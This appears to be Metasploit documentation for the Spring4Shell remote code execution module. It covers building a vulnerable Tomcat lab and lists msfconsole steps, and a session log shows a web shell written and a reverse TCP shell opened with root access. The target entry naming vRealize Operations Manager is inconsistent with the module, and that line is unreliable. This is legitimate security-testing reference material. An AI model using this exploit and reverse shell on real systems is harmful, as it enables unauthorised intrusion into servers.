## Vulnerable Application

### Description

The vulnerability impacts Spring MVC and Spring WebFlux applications running on JDK 9+. The specific exploit requires the application to run on Tomcat as a WAR deployment. If the application is deployed as a Spring Boot executable jar, i.e. the default, it is not vulnerable to the exploit. However, the nature of the vulnerability is more general, and there may be other ways to exploit it.

### Setup

Clone vanila spring application `git clone https://spring.io/guides/gs/handling-form-submission/`
get into the directory `handling-form-submission/complete/`

Change the files as follow

<details>
<summary>pom.xml</summary>
<p>

```diff
--- a/complete/pom.xml
+++ b/complete/pom.xml
@@ -8,6 +8,7 @@
                <version>2.6.3</version>
                <relativePath/> <!-- lookup parent from repository -->
        </parent>
+       <packaging>war</packaging>
        <groupId>com.example</groupId>
        <artifactId>handling-form-submission-complete</artifactId>
        <version>0.0.1-SNAPSHOT</version>
@@ -20,24 +21,35 @@
                <dependency>
                        <groupId>org.springframework.boot</groupId>
                        <artifactId>spring-boot-starter-thymeleaf</artifactId>
+                       <version>2.6.3</version>
                </dependency>
                <dependency>
                        <groupId>org.springframework.boot</groupId>
                        <artifactId>spring-boot-starter-web</artifactId>
+                        <version>2.6.3</version>
                </dependency>

                <dependency>
                        <groupId>org.springframework.boot</groupId>
                        <artifactId>spring-boot-starter-test</artifactId>
+                        <version>2.6.3</version>
                        <scope>test</scope>
                </dependency>
+               <dependency>
+                       <groupId>org.springframework.boot</groupId>
+                       <artifactId>spring-boot-starter-tomcat</artifactId>
+                       <version>2.6.3</version>
+                       <scope>provided</scope>
+               </dependency>
        </dependencies>

        <build>
+               <finalName>handlingformsubmission</finalName>
                <plugins>
                        <plugin>
                                <groupId>org.springframework.boot</groupId>
                                <artifactId>spring-boot-maven-plugin</artifactId>
+                                <version>2.6.3</version>
                        </plugin>
                </plugins>
        </build>
```

</p>
</details>



<details>
<summary>HandlingFormSubmissionApplication.java</summary>
<p>


```diff
--- a/complete/src/main/java/com/example/handlingformsubmission/HandlingFormSubmissionApplication.java
+++ b/complete/src/main/java/com/example/handlingformsubmission/HandlingFormSubmissionApplication.java
@@ -2,9 +2,10 @@ package com.example.handlingformsubmission;

 import org.springframework.boot.SpringApplication;
 import org.springframework.boot.autoconfigure.SpringBootApplication;
+import org.springframework.boot.web.servlet.support.SpringBootServletInitializer;

 @SpringBootApplication
-public class HandlingFormSubmissionApplication {
+public class HandlingFormSubmissionApplication extends SpringBootServletInitializer {

        public static void main(String[] args) {
                SpringApplication.run(HandlingFormSubmissionApplication.class, args);
```

</p>
</details>

Create a Dockerfile in the same directory

```Dockerfile
FROM tomcat:9.0.59-jdk11

ADD src/ /root/src
ADD pom.xml /root

#  Build spring app
RUN apt update && apt install maven -y
WORKDIR /root/
RUN mvn clean package

#  Deploy to tomcat
RUN mv target/handlingformsubmission.war /usr/local/tomcat/webapps/

WORKDIR /usr/local/tomcat/

EXPOSE 8080
CMD ["catalina.sh", "run"]
```
Build an image

```bash
docker build --rm --no-cache -t spring4shell .
```

Run a container

```bash
dodocker run --rm -it -p 9090:8080 spring4shell
```

The application must be avaliable at `http://localhost:9090/handlingformsubmission/greeting`

## Verification Steps

Follow [Setup](#setup) and [Scenarios](#scenarios).

## Targets

### 0

`vRealize Operations Manager < 8.3.0`


### Version and OS
This module has been tested successfully on Apache Tomcat 9.0.59, Openjdk 11.0.14.1 and spring-webmvc-5.3.15


## Verification Steps
Confirm that functionality works:

1. Start `msfconsole`
2. `use exploit/multi/http/spring4shell_rce`
3. set `RHOSTS`, `RPORT` and `TARGETURI`
4. Confirm the target is vulnerable: `check`
5. It come already with a default payload `java/jsp_shell_reverse_tcp`
7. set `LHOST` and `LPORT`
8. `exploit`
9. Confirm you have now a cmd session

## Options

### TARGETURI (required)

The path to the Spring application running on Tomcat. By default, the path is  `/`.

### PAYLOAD_PATH (required)

The path to write the payload (Default: `webapps/ROOT`).


## Scenarios Spring Web 5.3.15 Openjdk 11
```
msf6 exploit(multi/http/spring4shell_rce) > exploit 

[*] Started reverse TCP handler on 192.168.137.1:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Resetting Log Variables
[*] Modifying Log Configurations
[*] Send the packet that writes the web shell
[*] Executing JSP payload
[*] http://127.0.0.1:9090/helloworld/greeting/o39jGjG4q4Pje.jsp
[!] Tried to delete o39jGjG4q4Pje.jsp, unknown result
[*] Command shell session 2 opened (192.168.137.1:4444 -> 192.168.137.1:52314 ) at 2022-04-06 23:04:00 +0200

id
uid=0(root) gid=0(root) groups=0(root)

java --version
openjdk 11.0.14.1 2022-02-08
OpenJDK Runtime Environment 18.9 (build 11.0.14.1+1)
OpenJDK 64-Bit Server VM 18.9 (build 11.0.14.1+1, mixed mode, sharing)

ls -l /usr/local/tomcat/webapps/helloworld/WEB-INF/lib/spring*
-rw-r----- 1 root root  382856 Apr  5 19:59 /usr/local/tomcat/webapps/helloworld/WEB-INF/lib/spring-aop-5.3.15.jar
-rw-r----- 1 root root  697431 Apr  5 19:59 /usr/local/tomcat/webapps/helloworld/WEB-INF/lib/spring-beans-5.3.15.jar
-rw-r----- 1 root root 1423985 Apr  5 19:59 /usr/local/tomcat/webapps/helloworld/WEB-INF/lib/spring-boot-2.6.3.jar
-rw-r----- 1 root root 1627754 Apr  5 19:59 /usr/local/tomcat/webapps/helloworld/WEB-INF/lib/spring-boot-autoconfigure-2.6.3.jar
-rw-r----- 1 root root   29397 Feb  1  1980 /usr/local/tomcat/webapps/helloworld/WEB-INF/lib/spring-boot-jarmode-layertools-2.6.3.jar
-rw-r----- 1 root root 1271872 Apr  5 19:59 /usr/local/tomcat/webapps/helloworld/WEB-INF/lib/spring-context-5.3.15.jar
-rw-r----- 1 root root 1480617 Apr  5 19:59 /usr/local/tomcat/webapps/helloworld/WEB-INF/lib/spring-core-5.3.15.jar
-rw-r----- 1 root root  288784 Apr  5 19:59 /usr/local/tomcat/webapps/helloworld/WEB-INF/lib/spring-expression-5.3.15.jar
-rw-r----- 1 root root   24440 Apr  5 19:59 /usr/local/tomcat/webapps/helloworld/WEB-INF/lib/spring-jcl-5.3.15.jar
-rw-r----- 1 root root 1638528 Apr  5 19:59 /usr/local/tomcat/webapps/helloworld/WEB-INF/lib/spring-web-5.3.15.jar
-rw-r----- 1 root root 1028435 Apr  5 19:59 /usr/local/tomcat/webapps/helloworld/WEB-INF/lib/spring-webmvc-5.3.15.jar

java -cp /usr/local/tomcat/lib/catalina.jar org.apache.catalina.util.ServerInfo
Server version: Apache Tomcat/9.0.59
Server built:   Feb 21 2022 21:01:10 UTC
Server number:  9.0.59.0
OS Name:        Linux
OS Version:     5.10.60.1-microsoft-standard-WSL2
Architecture:   amd64
JVM Version:    11.0.14.1+1
JVM Vendor:     Oracle Corporation

exit
[*] 127.0.0.1 - Command shell session 2 closed.
msf6 exploit(multi/http/spring4shell_rce) > 
```
